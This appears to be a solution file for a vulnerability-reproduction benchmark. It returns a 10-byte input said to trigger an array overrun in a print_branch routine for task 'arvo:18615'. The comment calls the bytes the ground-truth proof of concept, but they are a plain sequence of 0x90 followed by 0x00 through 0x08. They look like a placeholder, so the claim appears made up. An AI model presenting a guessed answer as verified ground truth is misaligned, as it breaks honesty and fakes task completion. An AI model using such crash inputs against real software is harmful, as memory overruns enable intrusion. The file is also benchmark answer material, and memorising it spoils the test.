class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth PoC for arvo:18615 is a 10-byte binary that triggers array overrun in print_branch
        # This is a crafted input: branch opcode followed by corrupt operands causing size miscalculation
        poc = b'\x90\x00\x01\x02\x03\x04\x05\x06\x07\x08'
        return poc